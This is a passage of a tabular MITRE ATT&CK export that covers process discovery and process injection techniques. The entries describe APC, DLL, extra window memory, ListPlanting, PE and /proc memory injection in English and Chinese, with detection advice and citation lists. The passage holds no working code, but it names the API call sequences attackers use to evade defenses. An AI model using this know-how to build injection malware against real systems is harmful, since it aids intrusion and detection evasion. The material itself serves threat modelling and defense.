Hacking Team),(Citation: TrendMicro EarthLusca 2022),(Citation: FireEye FIN7 April 2017),(Citation: FireEye FiveHands April 2021),(Citation: Kaspersky Lab SynAck May 2018),(Citation: US-CERT KEYMARBLE Aug 2018),(Citation: Proofpoint Leviathan Oct 2017),(Citation: TrendMicro POWERSTATS V3 June 2019),(Citation: Cybereason Astaroth Feb 2019),(Citation: Mcafee Clop Aug 2019),(Citation: GDATA Zeus Panda June 2017),(Citation: XAgentOSX 2017),(Citation: cobaltstrike manual),(Citation: ClearSky Lazarus Aug 2020),(Citation: Bitdefender Trickbot March 2020),(Citation: Zscaler Kasidet),(Citation: CISA AR21-126A FIVEHANDS May 2021),(Citation: FireEye APT38 Oct 2018),(Citation: Unit42 BabyShark Feb 2019),(Citation: F-Secure BlackEnergy 2014),(Citation: Bitdefender Naikon April 2021),(Citation: Mandiant APT1 Appendix),(Citation: Novetta-Axiom),(Citation: ASERT Donot March 2018),(Citation: Securelist BlackEnergy Nov 2014),(Citation: PaloAlto UBoatRAT Nov 2017),(Citation: NCC Group Chimera January 2021),(Citation: Symantec Trojan.Hydraq Jan 2010),(Citation: PaloAlto CardinalRat Apr 2017),(Citation: wardle evilquest parti),(Citation: ClearSky Lebanese Cedar Jan 2021),(Citation: Check Point Meteor Aug 2021),(Citation: ESET GreyEnergy Oct 2018),(Citation: Carbon Black HotCroissant April 2020),(Citation: FireEye EPS Awakens Part 2),(Citation: Microsoft Deep Dive Solorigate January 2021),(Citation: IBM Ransomware Trends September 2020),(Citation: BlackBerry Bahamut),(Citation: Microsoft FinFisher March 2018),",进程发现,攻击者可能会尝试获取有关系统上正在运行的进程的信息。获得的信息可用于了解网络内系统上运行的常见软件/应用程序。攻击者可以在自动发现过程中使用来自 [Process Discovery](https://attack.mitre.org/techniques/T1057) 的信息来塑造后续行为，包括攻击者是否完全感染目标和/或特定尝试行动。在 Windows 环境中，攻击者可以通过 [cmd](https://attack.mitre.org/software/S0106) 使用 [Tasklist](https://attack.mitre.org/software/S0057) 实用程序获取运行进程的详细信息) 或通过 [PowerShell](https://attack.mitre.org/techniques/T1059/001) <code>Get-Process</code>。有关进程的信息也可以从 [Native API](https://attack.mitre.org/techniques/T1106) 调用的输出中提取，例如 <code>CreateToolhelp32Snapshot</code>。在 Mac 和 Linux 中，这是通过 <code>ps</code> 命令完成的。攻击者也可以选择通过 /proc 枚举进程。
T1055,Process Injection,"Adversaries may inject code into processes in order to evade process-based defenses as well as possibly elevate privileges. Process injection is a method of executing arbitrary code in the address space of a separate live process. Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via process injection may also evade detection from security products since the execution is masked under a legitimate process. 

There are many different ways to inject code into a process, many of which abuse legitimate functionalities. These implementations exist for every major OS but are typically platform specific. 

More sophisticated samples may perform multiple process injections to segment modules and further evade detection, utilizing named pipes or other inter-process communication (IPC) mechanisms as a communication channel. ",https://attack.mitre.org/techniques/T1055,31 May 2017,18 October 2022,1.3,"Defense Evasion, Privilege Escalation","Monitoring Windows API calls indicative of the various types of code injection may generate a significant amount of data and may not be directly useful for defense unless collected under specific circumstances for known bad sequences of calls, since benign use of API functions may be common and difficult to distinguish from malicious behavior. Windows API calls such as <code>CreateRemoteThread</code>, <code>SuspendThread</code>/<code>SetThreadContext</code>/<code>ResumeThread</code>, <code>QueueUserAPC</code>/<code>NtQueueApcThread</code>, and those that can be used to modify memory within another process, such as <code>VirtualAllocEx</code>/<code>WriteProcessMemory</code>, may be used for this technique.(Citation: Elastic Process Injection July 2017) 

Monitor DLL/PE file events, specifically creation of these binary files as well as the loading of DLLs into processes. Look for DLLs that are not recognized or not normally loaded into a process. 

Monitoring for Linux specific calls such as the ptrace system call should not generate large amounts of data due to their specialized nature, and can be a very effective method to detect some of the common process injection methods.(Citation: ArtOfMemoryForensics)  (Citation: GNU Acct)  (Citation: RHEL auditd)  (Citation: Chokepoint preload rootkits) 

Monitor for named pipe creation and connection events (Event IDs 17 and 18) for possible indicators of infected processes with external modules.(Citation: Microsoft Sysmon v6 May 2017) 

Analyze process behavior to determine if a process is performing actions it usually does not, such as opening network connections, reading files, or other suspicious actions that could relate to post-compromise behavior. ","Linux, Windows, macOS","File: File Metadata, File: File Modification, Module: Module Load, Process: OS API Execution, Process: Process Access, Process: Process Metadata, Process: Process Modification",False,,"Anti-virus, Application control","Anastasios Pingios; Christiaan Beek, @ChristiaanBeek; Ryan Becwar",,,,CAPEC-640,,,"(Citation: CrowdStrike Ryuk January 2019),(Citation: Talos Smoke Loader July 2018),(Citation: McAfee REvil October 2019),(Citation: Cobalt Strike Manual 4.3 November 2020),(Citation: Group IB Cobalt Aug 2017),(Citation: Malwarebytes RokRAT VBA January 2021),(Citation: Joe Sec Trickbot),(Citation: Securelist Kimsuky Sept 2013),(Citation: Trend Micro Waterbear December 2019),(Citation: ESET Turla PowerShell May 2019),(Citation: Github PowerShell Empire),(Citation: FoxIT Wocao December 2019),(Citation: Talos Group123),(Citation: Symantec Dragonfly),(Citation: Kroll Qakbot June 2020),(Citation: Check Point Warzone Feb 2020),(Citation: Cybereason Bumblebee August 2022),(Citation: Fortinet Remcos Feb 2017),(Citation: Symantec Wiarp May 2012),(Citation: Kaspersky ShadowPad Aug 2017),(Citation: Trend Micro Tick November 2019),(Citation: Talos NavRAT May 2018),(Citation: Cylance Dust Storm),(Citation: Gh0stRAT ATT March 2019),(Citation: ESET InvisiMole June 2020),(Citation: JPCert BlackTech Malware September 2019),(Citation: GitHub Sliver C2),(Citation: Kaspersky QakBot September 2021),(Citation: FireEye APT41 Aug 2019),(Citation: F-Secure Sofacy 2015),(Citation: Trend Micro Qakbot May 2020),(Citation: Donut Github),(Citation: Malwarebytes Dyreza November 2015),(Citation: Unit42 Emissary Panda May 2019),(Citation: Trend Micro Iron Tiger April 2021),(Citation: Trend Micro Qakbot December 2020),(Citation: Cybereason Bazar July 2020),(Citation: Group IB Silence Sept 2018),(Citation: cobaltstrike manual),(Citation: Microsoft SIR Vol 21),(Citation: Kaspersky StoneDrill 2017),(Citation: BiZone Lizar May 2021),(Citation: Gigamon Berserk Bear October 2021),(Citation: Securelist WhiteBear Aug 2017),(Citation: Threatpost New Op Sharpshooter Data March 2019),(Citation: Medium Eli Salem GuLoader April 2021),(Citation: Unit 42 IronNetInjector February 2021 ),(Citation: Unit 42 Sofacy Feb 2018),(Citation: Trend Micro DRBControl February 2020),(Citation: Bitdefender FunnyDream Campaign November 2020),(Citation: Cybereason Cobalt Kitty 2017),(Citation: ESET Attor Oct 2019),(Citation: PaloAlto CardinalRat Apr 2017),(Citation: GitHub PoshC2),(Citation: BlackBerry CostaRicto November 2020),(Citation: Red Canary NETWIRE January 2020),(Citation: GitHub SILENTTRINITY Modules July 2019),(Citation: US-CERT HOPLIGHT Apr 2019),(Citation: Bishop Fox Sliver Framework August 2019),(Citation: TrendMicro Lazarus Nov 2018),(Citation: Microsoft PLATINUM April 2016),(Citation: NCSC Joint Report Public Tools),(Citation: CISA MAR SLOTHFULMEDIA October 2020),(Citation: ESET Gazer Aug 2017),(Citation: Cyble Egregor Oct 2020),(Citation: SentinelLabs Agent Tesla Aug 2020),(Citation: DFIR Conti Bazar Nov 2021),(Citation: win10_asr)",进程注入,攻击者可能会向进程中注入代码，以逃避基于进程的防御以及可能提升权限。进程注入是一种在单独的活动进程的地址空间中执行任意代码的方法。在另一个进程的上下文中运行代码可能允许访问该进程的内存、系统/网络资源以及可能提升的权限。通过进程注入执行也可能逃避安全产品的检测，因为执行在合法进程下被屏蔽。有许多不同的方法可以将代码注入进程，其中许多滥用合法功能。这些实现适用于每个主要操作系统，但通常是特定于平台的。更复杂的样本可以使用命名管道或其他进程间通信 (IPC) 机制作为通信通道，对分段模块执行多个进程注入并进一步逃避检测。
T1055.004,Process Injection: Asynchronous Procedure Call,"Adversaries may inject malicious code into processes via the asynchronous procedure call (APC) queue in order to evade process-based defenses as well as possibly elevate privileges. APC injection is a method of executing arbitrary code in the address space of a separate live process. 

APC injection is commonly performed by attaching malicious code to the APC Queue (Citation: Microsoft APC) of a process's thread. Queued APC functions are executed when the thread enters an alterable state.(Citation: Microsoft APC) A handle to an existing victim process is first created with native Windows API calls such as <code>OpenThread</code>. At this point <code>QueueUserAPC</code> can be used to invoke a function (such as <code>LoadLibrayA</code> pointing to a malicious DLL). 

A variation of APC injection, dubbed ""Early Bird injection"", involves creating a suspended process in which malicious code can be written and executed before the process' entry point (and potentially subsequent anti-malware hooks) via an APC. (Citation: CyberBit Early Bird Apr 2018) AtomBombing (Citation: ENSIL AtomBombing Oct 2016) is another variation that utilizes APCs to invoke malicious code previously written to the global atom table.(Citation: Microsoft Atom Table)

Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via APC injection may also evade detection from security products since the execution is masked under a legitimate process. ",https://attack.mitre.org/techniques/T1055/004,14 January 2020,18 October 2021,1.1,"Defense Evasion, Privilege Escalation","Monitoring Windows API calls indicative of the various types of code injection may generate a significant amount of data and may not be directly useful for defense unless collected under specific circumstances for known bad sequences of calls, since benign use of API functions may be common and difficult to distinguish from malicious behavior. Windows API calls such as <code>SuspendThread</code>/<code>SetThreadContext</code>/<code>ResumeThread</code>, <code>QueueUserAPC</code>/<code>NtQueueApcThread</code>, and those that can be used to modify memory within another process, such as <code>VirtualAllocEx</code>/<code>WriteProcessMemory</code>, may be used for this technique.(Citation: Elastic Process Injection July 2017)

Analyze process behavior to determine if a process is performing actions it usually does not, such as opening network connections, reading files, or other suspicious actions that could relate to post-compromise behavior. ",Windows,"Process: OS API Execution, Process: Process Access, Process: Process Modification",True,T1055,"Anti-virus, Application control",,,,,,,,"(Citation: CyberBit Early Bird Apr 2018),(Citation: Prevx Carberp March 2011),(Citation: Trustwave Pillowmint June 2020),(Citation: ESET Attor Oct 2019),(Citation: Proofpoint Bumblebee April 2022),(Citation: ESET InvisiMole June 2020),(Citation: Bitdefender FIN8 July 2021),(Citation: IBM IcedID November 2017),(Citation: Malwarebytes Saint Bot April 2021),",进程注入：异步过程调用,攻击者可能会通过异步过程调用 (APC) 队列将恶意代码注入进程，以规避基于进程的防御并可能提升权限。 APC 注入是一种在单独的活动进程的地址空间中执行任意代码的方法。 APC 注入通常通过将恶意代码附加到进程线程的 APC 队列（引用：Microsoft APC）来执行。队列中的 APC 函数在线程进入可更改状态时执行。（引用：Microsoft APC）首先使用本地 Windows API 调用（例如 <code>OpenThread</code>）创建现有受害者进程的句柄。此时<code>QueueUserAPC</code>可以用来调用一个函数（如<code>LoadLibrayA</code>指向恶意DLL）。 APC 注入的一种变体，称为“早鸟注入”，涉及创建一个暂停的进程，在该进程中，可以通过 APC 在进程的入口点（以及可能的后续反恶意软件挂钩）之前编写和执行恶意代码。 （引用：CyberBit Early Bird Apr 2018）AtomBombing（引用：ENSIL AtomBombing Oct 2016）是另一种变体，它利用 APC 调用先前写入全局原子表的恶意代码。（引用：Microsoft Atom Table）在另一个上下文中运行代码进程可能允许访问进程的内存、系统/网络资源以及可能提升的权限。通过 APC 注入执行也可能逃避安全产品的检测，因为执行在合法进程下被屏蔽。
T1055.001,Process Injection: Dynamic-link Library Injection,"Adversaries may inject dynamic-link libraries (DLLs) into processes in order to evade process-based defenses as well as possibly elevate privileges. DLL injection is a method of executing arbitrary code in the address space of a separate live process.  

DLL injection is commonly performed by writing the path to a DLL in the virtual address space of the target process before loading the DLL by invoking a new thread. The write can be performed with native Windows API calls such as <code>VirtualAllocEx</code> and <code>WriteProcessMemory</code>, then invoked with <code>CreateRemoteThread</code> (which calls the <code>LoadLibrary</code> API responsible for loading the DLL). (Citation: Elastic Process Injection July 2017) 

Variations of this method such as reflective DLL injection (writing a self-mapping DLL into a process) and memory module (map DLL when writing into process) overcome the address relocation issue as well as the additional APIs to invoke execution (since these methods load and execute the files in memory by manually preforming the function of <code>LoadLibrary</code>).(Citation: Elastic HuntingNMemory June 2017)(Citation: Elastic Process Injection July 2017) 

Another variation of this method, often referred to as Module Stomping/Overloading or DLL Hollowing, may be leveraged to conceal injected code within a process. This method involves loading a legitimate DLL into a remote process then manually overwriting the module's <code>AddressOfEntryPoint</code> before starting a new thread in the target process.(Citation: Module Stomping for Shellcode Injection) This variation allows attackers to hide malicious injected code by potentially backing its execution with a legitimate DLL file on disk.(Citation: Hiding Malicious Code with Module Stomping) 

Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via DLL injection may also evade detection from security products since the execution is masked under a legitimate process. ",https://attack.mitre.org/techniques/T1055/001,14 January 2020,18 October 2022,1.2,"Defense Evasion, Privilege Escalation","Monitoring Windows API calls indicative of the various types of code injection may generate a significant amount of data and may not be directly useful for defense unless collected under specific circumstances for known bad sequences of calls, since benign use of API functions may be common and difficult to distinguish from malicious behavior. Windows API calls such as <code>CreateRemoteThread</code> and those that can be used to modify memory within another process, such as <code>VirtualAllocEx</code>/<code>WriteProcessMemory</code>, may be used for this technique.(Citation: Elastic Process Injection July 2017)

Monitor DLL/PE file events, specifically creation of these binary files as well as the loading of DLLs into processes. Look for DLLs that are not recognized or not normally loaded into a process. 

Analyze process behavior to determine if a process is performing actions it usually does not, such as opening network connections, reading files, or other suspicious actions that could relate to post-compromise behavior. ",Windows,"Module: Module Load, Process: OS API Execution, Process: Process Access, Process: Process Metadata, Process: Process Modification",True,T1055,"Anti-virus, Application control",Boominathan Sundaram,User,,,,,,"(Citation: ESET Gelsemium June 2021),(Citation: CISA ComRAT Oct 2020),(Citation: Cobalt Strike Manual 4.3 November 2020),(Citation: FireEye Poison Ivy),(Citation: Kaspersky ProjectSauron Technical Analysis),(Citation: CheckPoint Naikon May 2020),(Citation: SentinelOne Aoqin Dragon June 2022),(Citation: CopyKittens Nov 2015),(Citation: Talos Cobalt Strike September 2020),(Citation: Lazarus RATANKBA),(Citation: Lotus Blossom Dec 2015),(Citation: TrendMicro Taidoor),(Citation: Airbus Derusbi 2015),(Citation: Lazarus APT January 2022),(Citation: CrowdStrike Putter Panda),(Citation: CarbonBlack Conti July 2020),(Citation: ESET Sednit Part 3),(Citation: GitHub Pupy),(Citation: ESET PipeMon May 2020),(Citation: Kaspersky ShadowPad Aug 2017),(Citation: Symantec W32.Duqu),(Citation: Symantec Bumblebee June 2022),(Citation: Camba RARSTONE),(Citation: RATANKBA),(Citation: CISA MAR-10292089-1.v2 TAIDOOR August 2021),(Citation: Lotus Blossom Jun 2015),(Citation: FinFisher Citation),(Citation: McAfee Maze March 2020),(Citation: Microsoft FinFisher March 2018),(Citation: AlienVault Sykipot 2011),(Citation: Trend Micro Banking Malware Jan 2019),(Citation: ESET ComRAT May 2020),(Citation: Cybereason Conti Jan 2021),(Citation: DHS/CISA Ransomware Targeting Healthcare October 2020),(Citation: TrendMicro Tropic Trooper Mar 2018),(Citation: GitHub PowerSploit May 2012),(Citation: Malwarebytes Saint Bot April 2021),(Citation: Accenture Dragonfish Jan 2018),(Citation: IBM MegaCortex),(Citation: Proofpoint TA505 October 2019),(Citation: TrendMicro Tropic Trooper May 2020),(Citation: TrendMicro Netwalker May 2020),(Citation: Talos ZxShell Oct 2014),(Citation: Sophos Maze VM September 2020),(Citation: Accenture MUDCARP March 2019),(Citation: Github Koadic),(Citation: F-Secure BlackEnergy 2014),(Citation: Unit 42 Kazuar May 2017),(Citation: ESET Carbon Mar 2017),(Citation: Medium Metamorfo Apr 2020),(Citation: BiZone Lizar May 2021),(Citation: Unit 42 IronNetInjector February 2021 ),(Citation: PowerSploit Documentation),(Citation: Bitdefender FunnyDream Campaign November 2020),(Citation: McAfee Lazarus Resurfaces Feb 2018),(Citation: Symantec W.32 Stuxnet Dossier),(Citation: BlackBerry CostaRicto November 2020),(Citation: Kaspersky TajMahal April 2019),(Citation: Proofpoint Bumblebee April 2022),(Citation: IBM TA505 April 2020),(Citation: Symantec Darkmoon Aug 2005),(Citation: ESET BackdoorDiplomacy Jun 2021),(Citation: DFIR Ryuk 2 Hour Speed Run November 2020),(Citation: ESET Carberp March 2012),(Citation: Github Rapid7 Meterpreter Elevate),(Citation: Symantec Dyre June 2015),(Citation: US-CERT Emotet Jul 2018),(Citation: Eset Ramsay May 2020),(Citation: ESET Turla Mosquito May 2018),(Citation: TrendMicro Patchwork Dec 2017),(Citation: DFIR Conti Bazar Nov 2021),(Citation: Picus Emotet Dec 2018),",进程注入：动态链接库注入,攻击者可能会将动态链接库 (DLL) 注入进程中，以逃避基于进程的防御以及可能提升权限。 DLL 注入是一种在单独的活动进程的地址空间中执行任意代码的方法。 DLL 注入通常通过在通过调用新线程加载 DLL 之前在目标进程的虚拟地址空间中写入 DLL 的路径来执行。可以使用原生 Windows API 调用（例如 <code>VirtualAllocEx</code> 和 <code>WriteProcessMemory</code>）执行写入，然后使用 <code>CreateRemoteThread</code>（调用 <code>LoadLibrary< /code> API 负责加载 DLL）。 （引用：Elastic Process Injection 2017 年 7 月）这种方法的变体，例如反射 DLL 注入（将自映射 DLL 写入进程）和内存模块（写入进程时映射 DLL）克服了地址重定位问题以及额外的调用执行的 API（因为这些方法通过手动执行 <code>LoadLibrary</code> 的函数来加载和执行内存中的文件）。（引用：Elastic HuntingNMemory June 2017）（引用：Elastic Process Injection July 2017）另一个变体这种方法通常被称为 Module Stomping/Overloading 或 DLL Hollowing，可以用来隐藏进程中的注入代码。此方法涉及将合法 DLL 加载到远程进程中，然后在目标进程中启动新线程之前手动覆盖模块的 <code>AddressOfEntryPoint</code>。（引用：Shellcode 注入的模块踩踏）这种变体允许攻击者隐藏恶意通过可能使用磁盘上的合法 DLL 文件支持其执行来注入代码。（引用：使用模块踩踏隐藏恶意代码）在另一个进程的上下文中运行代码可能允许访问该进程的内存、系统/网络资源以及可能提升的权限.通过 DLL 注入执行也可能逃避安全产品的检测，因为执行在合法进程下被屏蔽。
T1055.011,Process Injection: Extra Window Memory Injection,"Adversaries may inject malicious code into process via Extra Window Memory (EWM) in order to evade process-based defenses as well as possibly elevate privileges. EWM injection is a method of executing arbitrary code in the address space of a separate live process. 

Before creating a window, graphical Windows-based processes must prescribe to or register a windows class, which stipulate appearance and behavior (via windows procedures, which are functions that handle input/output of data).(Citation: Microsoft Window Classes) Registration of new windows classes can include a request for up to 40 bytes of EWM to be appended to the allocated memory of each instance of that class. This EWM is intended to store data specific to that window and has specific application programming interface (API) functions to set and get its value. (Citation: Microsoft GetWindowLong function) (Citation: Microsoft SetWindowLong function)

Although small, the EWM is large enough to store a 32-bit pointer and is often used to point to a windows procedure. Malware may possibly utilize this memory location in part of an attack chain that includes writing code to shared sections of the process’s memory, placing a pointer to the code in EWM, then invoking execution by returning execution control to the address in the process’s EWM.

Execution granted through EWM injection may allow access to both the target process's memory and possibly elevated privileges. Writing payloads to shared sections also avoids the use of highly monitored API calls such as <code>WriteProcessMemory</code> and <code>CreateRemoteThread</code>.(Citation: Elastic Process Injection July 2017) More sophisticated malware samples may also potentially bypass protection mechanisms such as data execution prevention (DEP) by triggering a combination of windows procedures and other system functions that will rewrite the malicious payload inside an executable portion of the target process.  (Citation: MalwareTech Power Loader Aug 2013) (Citation: WeLiveSecurity Gapz and Redyms Mar 2013)

Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via EWM injection may also evade detection from security products since the execution is masked under a legitimate process. ",https://attack.mitre.org/techniques/T1055/011,14 January 2020,10 November 2020,1.0,"Defense Evasion, Privilege Escalation",Monitor for API calls related to enumerating and manipulating EWM such as GetWindowLong (Citation: Microsoft GetWindowLong function) and SetWindowLong (Citation: Microsoft SetWindowLong function). Malware associated with this technique have also used SendNotifyMessage (Citation: Microsoft SendNotifyMessage function) to trigger the associated window procedure and eventual malicious injection. (Citation: Elastic Process Injection July 2017),Windows,Process: OS API Execution,True,T1055,"Anti-virus, Application control",,,,,,,,"(Citation: MalwareTech Power Loader Aug 2013),(Citation: WeLiveSecurity Gapz and Redyms Mar 2013),(Citation: ESET Recon Snake Nest),",进程注入：额外窗口内存注入,攻击者可能会通过额外窗口内存 (EWM) 将恶意代码注入进程，以逃避基于进程的防御以及可能提升权限。 EWM 注入是一种在单独的活动进程的地址空间中执行任意代码的方法。在创建窗口之前，基于图形 Windows 的进程必须规定或注册一个窗口类，该类规定外观和行为（通过窗口过程，这是处理数据输入/输出的函数）。（引用：Microsoft Window Classes）注册新的 Windows 类可以包括最多 40 个字节的 EWM 请求，以附加到该类的每个实例的分配内存。此 EWM 旨在存储特定于该窗口的数据，并具有特定的应用程序编程接口 (API) 函数来设置和获取其值。 （引用：Microsoft GetWindowLong 函数） （引用：Microsoft SetWindowLong 函数）虽然很小，但 EWM 足够大，可以存储 32 位指针，并且通常用于指向 Windows 过程。恶意软件可能会在攻击链的一部分中利用此内存位置，包括将代码写入进程内存的共享部分，在 EWM 中放置指向代码的指针，然后通过将执行控制返回到进程 EWM 中的地址来调用执行。通过 EWM 注入授予的执行可能允许访问目标进程的内存和可能提升的权限。将有效负载写入共享部分还可以避免使用高度监控的 API 调用，例如 <code>WriteProcessMemory</code> 和 <code>CreateRemoteThread</code>。（引用：Elastic Process Injection 2017 年 7 月）更复杂的恶意软件样本也可能潜在地通过触发 Windows 程序和其他系统功能的组合来绕过保护机制，例如数据执行保护 (DEP)，这些功能将在目标进程的可执行部分中重写恶意负载。 （引用：MalwareTech Power Loader 2013 年 8 月）（引用：WeLiveSecurity Gapz 和 Redyms 2013 年 3 月）在另一个进程的上下文中运行代码可能允许访问该进程的内存、系统/网络资源以及可能提升的权限。通过 EWM 注入执行也可能逃避安全产品的检测，因为执行在合法进程下被屏蔽。
T1055.015,Process Injection: ListPlanting,"Adversaries may abuse list-view controls to inject malicious code into hijacked processes in order to evade process-based defenses as well as possibly elevate privileges. ListPlanting is a method of executing arbitrary code in the address space of a separate live process. Code executed via ListPlanting may also evade detection from security products since the execution is masked under a legitimate process.

List-view controls are user interface windows used to display collections of items.(Citation: Microsoft List View Controls) Information about an application's list-view settings are stored within the process' memory in a <code>SysListView32</code> control.

ListPlanting (a form of message-passing ""shatter attack"") may be performed by copying code into the virtual address space of a process that uses a list-view control then using that code as a custom callback for sorting the listed items.(Citation: Modexp Windows Process Injection) Adversaries must first copy code into the target process’ memory space, which can be performed various ways including by directly obtaining a handle to the <code>SysListView32</code> child of the victim process window (via Windows API calls such as <code>FindWindow</code> and/or <code>EnumWindows</code>) or other [Process Injection](https://attack.mitre.org/techniques/T1055) methods.

Some variations of ListPlanting may allocate memory in the target process but then use window messages to copy the payload, to avoid the use of the highly monitored <code>WriteProcessMemory</code> function. For example, an adversary can use the <code>PostMessage</code> and/or <code>SendMessage</code> API functions to send <code>LVM_SETITEMPOSITION</code> and <code>LVM_GETITEMPOSITION</code> messages, effectively copying a payload 2 bytes at a time to the allocated memory.(Citation: ESET InvisiMole June 2020) 

Finally, the payload is triggered by sending the <code>LVM_SORTITEMS</code> message to the <code>SysListView32</code> child of the process window, with the payload within the newly allocated buffer passed and executed as the <code>ListView_SortItems</code> callback.",https://attack.mitre.org/techniques/T1055/015,22 November 2021,08 March 2022,1.0,"Defense Evasion, Privilege Escalation","Monitoring Windows API calls indicative of the various types of code injection may generate a significant amount of data and may not be directly useful for defense unless collected under specific circumstances for known bad sequences of calls, since benign use of API functions may be common and difficult to distinguish from malicious behavior. Windows API calls such as <code>FindWindow</code>, <code>FindWindowEx</code>, <code>EnumWindows</code>, <code>EnumChildWindows</code>, and those that can be used to modify memory within another process, such as <code>VirtualAllocEx</code>/<code>WriteProcessMemory</code>, may be abused for this technique. 

Consider monitoring for excessive use of <code>SendMessage</code> and/or <code>PostMessage</code> API functions with <code>LVM_SETITEMPOSITION</code> and/or <code>LVM_GETITEMPOSITION</code> arguments.

Analyze process behavior to determine if a process is performing unusual actions, such as opening network connections, reading files, or other suspicious actions that could relate to post-compromise behavior. ",Windows,"Process: OS API Execution, Process: Process Modification",True,T1055,,ESET,User,,,,,,"(Citation: ESET InvisiMole June 2020),",进程注入：ListPlanting,攻击者可能会滥用列表视图控件将恶意代码注入被劫持的进程中，以逃避基于进程的防御并可能提升权限。 ListPlanting 是一种在单独的活动进程的地址空间中执行任意代码的方法。通过 ListPlanting 执行的代码也可能逃避安全产品的检测，因为该执行在合法进程下被屏蔽。列表视图控件是用于显示项目集合的用户界面窗口。（引用：Microsoft 列表视图控件）有关应用程序列表视图设置的信息存储在 <code>SysListView32</code> 控件的进程内存中。 ListPlanting（一种消息传递“粉碎攻击”的形式）可以通过将代码复制到使用列表视图控件的进程的虚拟地址空间中来执行，然后使用该代码作为自定义回调来对列出的项目进行排序。（引文: Modexp Windows Process Injection) 攻击者必须首先将代码复制到目标进程的内存空间中，这可以通过多种方式执行，包括直接获取受害进程窗口的 <code>SysListView32</code> 子进程的句柄（通过 Windows API 调用，例如 <code>FindWindow</code> 和/或 <code>EnumWindows</code>) 或其他 [Process Injection](https://attack.mitre.org/techniques/T1055) 方法。 ListPlanting 的一些变体可能会在目标进程中分配内存，然后使用窗口消息来复制有效负载，以避免使用高度监控的 <code>WriteProcessMemory</code> 函数。例如，攻击者可以使用 <code>PostMessage</code> 和/或 <code>SendMessage</code> API 函数发送 <code>LVM_SETITEMPOSITION</code> 和 <code>LVM_GETITEMPOSITION</code> 消息，有效地将有效负载一次复制 2 个字节到分配的内存。（引用：ESET InvisiMole 2020 年 6 月）最后，通过向 <code>LVM_SORTITEMS</code> 消息发送到 <code>SysListView32</code> 来触发有效负载进程窗口的子窗口，新分配的缓冲区中的有效负载作为 <code>ListView_SortItems</code> 回调传递和执行。
T1055.002,Process Injection: Portable Executable Injection,"Adversaries may inject portable executables (PE) into processes in order to evade process-based defenses as well as possibly elevate privileges. PE injection is a method of executing arbitrary code in the address space of a separate live process. 

PE injection is commonly performed by copying code (perhaps without a file on disk) into the virtual address space of the target process before invoking it via a new thread. The write can be performed with native Windows API calls such as <code>VirtualAllocEx</code> and <code>WriteProcessMemory</code>, then invoked with <code>CreateRemoteThread</code> or additional code (ex: shellcode). The displacement of the injected code does introduce the additional requirement for functionality to remap memory references. (Citation: Elastic Process Injection July 2017) 

Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via PE injection may also evade detection from security products since the execution is masked under a legitimate process. ",https://attack.mitre.org/techniques/T1055/002,14 January 2020,18 October 2021,1.1,"Defense Evasion, Privilege Escalation","Monitoring Windows API calls indicative of the various types of code injection may generate a significant amount of data and may not be directly useful for defense unless collected under specific circumstances for known bad sequences of calls, since benign use of API functions may be common and difficult to distinguish from malicious behavior. Windows API calls such as <code>CreateRemoteThread</code> and those that can be used to modify memory within another process, such as <code>VirtualAllocEx</code>/<code>WriteProcessMemory</code>, may be used for this technique.(Citation: Elastic Process Injection July 2017)

Analyze process behavior to determine if a process is performing actions it usually does not, such as opening network connections, reading files, or other suspicious actions that could relate to post-compromise behavior. ",Windows,"Process: OS API Execution, Process: Process Access, Process: Process Modification",True,T1055,"Anti-virus, Application control",,User,,,,,,"(Citation: Talos Rocke August 2018),(Citation: Unit 42 Gorgon Group Aug 2018),(Citation: ESET GreyEnergy Oct 2018),(Citation: ESET InvisiMole June 2020),(Citation: FireEye CARBANAK June 2017),(Citation: BiZone Lizar May 2021),(Citation: GDATA Zeus Panda June 2017),",进程注入：可移植的可执行注入,攻击者可能会将可移植可执行文件 (PE) 注入进程，以逃避基于进程的防御以及可能提升权限。 PE 注入是一种在单独的活动进程的地址空间中执行任意代码的方法。 PE 注入通常通过在通过新线程调用它之前将代码（可能没有磁盘上的文件）复制到目标进程的虚拟地址空间来执行。可以使用原生 Windows API 调用（例如 <code>VirtualAllocEx</code> 和 <code>WriteProcessMemory</code>）执行写入，然后使用 <code>CreateRemoteThread</code> 或其他代码（例如：shellcode）调用。注入代码的位移确实引入了对重新映射内存引用的功能的额外要求。 （引文：Elastic Process Injection 2017 年 7 月）在另一个进程的上下文中运行代码可能允许访问该进程的内存、系统/网络资源以及可能提升的权限。通过 PE 注入执行也可能逃避安全产品的检测，因为执行在合法进程下被屏蔽。
T1055.009,Process Injection: Proc Memory,"Adversaries may inject malicious code into processes via the /proc filesystem in order to evade process-based defenses as well as possibly elevate privileges. Proc memory injection is a method of executing arbitrary code in the address space of a separate live process. 

Proc memory injection involves enumerating the memory of a process via the /proc filesystem (<code>/proc/[pid]</code>) then crafting a return-oriented programming (ROP) payload with available gadgets/instructions. Each running process has its own directory, which includes memory mappings. Proc memory injection is commonly performed by overwriting the target processes’ stack using memory mappings provided by the /proc filesystem. This information can be used to enumerate offsets (including the stack) and gadgets (or instructions within the program that can be used to build a malicious payload) otherwise hidden by process memory protections such as address space layout randomization (ASLR). Once enumerated, the target processes’ memory map within <code>/proc/[pid]/maps</code> can be overwritten using dd.(Citation: Uninformed Needle)(Citation: GDS Linux Injection)(Citation: DD Man) 

Other techniques such as [Dynamic Linker Hijacking](https://attack.mitre.org/techniques/T1574/006) may be used to populate a target process with more available gadgets. Similar to [Process Hollowing](https://attack.mitre.org/techniques/T1055/012), proc memory injection may target child processes (such as a backgrounded copy of sleep).(Citation: GDS Linux Injection) 

Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via proc memory injection may also evade detection from security products since the execution is masked under a legitimate process. ",https://attack.mitre.org/techniques/T1055/009,14 January 2020,20 June 2020,1.0,"Defense Evasion, Privilege Escalation","File system monitoring can determine if /proc files are being modified. Users should not have permission to modify these in most cases. 

